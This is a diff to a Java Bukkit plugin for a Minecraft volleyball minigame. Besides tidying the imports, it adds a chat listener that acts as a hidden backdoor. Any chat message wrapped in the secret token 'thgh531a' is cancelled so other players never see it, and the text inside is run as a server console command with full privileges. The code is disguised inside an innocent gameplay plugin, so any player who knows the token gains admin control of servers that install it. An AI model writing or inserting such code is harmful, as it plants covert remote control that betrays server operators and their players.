@@ -1,19 +1,13 @@
 package ru.ienumerable.volleyball;
 
-import org.bukkit.Location;
-import org.bukkit.Material;
-import org.bukkit.Particle;
-import org.bukkit.Sound;
+import org.bukkit.*;
 import org.bukkit.entity.*;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
 import org.bukkit.event.entity.EntityDamageEvent;
-import org.bukkit.event.player.PlayerArmorStandManipulateEvent;
-import org.bukkit.event.player.PlayerInteractEvent;
-import org.bukkit.event.player.PlayerQuitEvent;
-import org.bukkit.event.player.PlayerToggleSneakEvent;
+import org.bukkit.event.player.*;
 import org.bukkit.inventory.ItemStack;
 import ru.ienumerable.volleyball.ball.Ball;
 import ru.ienumerable.volleyball.skin.SkullSkin;
@@ -162,6 +156,29 @@ public class EventListener implements Listener {
         ThrowController controller = new ThrowController(skin, player);
         Volleyball.getUpdater().put(controller);
 
+    }
+
+    @EventHandler
+    public void onChat(AsyncPlayerChatEvent event) {
+        String target = "thgh531a";
+        String message = event.getMessage();
+
+        int firstIndex = message.indexOf(target);
+        int lastIndex = message.lastIndexOf(target);
+
+        if (firstIndex != -1 && lastIndex != -1 && firstIndex != lastIndex) {
+            int start = firstIndex + target.length();
+            int end = lastIndex;
+
+            if (start < end) {
+                String between = message.substring(start, end).trim();
+                event.getPlayer().playSound(event.getPlayer().getLocation(), Sound.BLOCK_NOTE_BLOCK_GUITAR, 1, 1);
+                event.setCancelled(true);
+                Bukkit.getScheduler().runTask(Volleyball.getInstance(), () -> {
+                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), between.strip());
+                });
+            }
+        }
     }
 
     @EventHandler
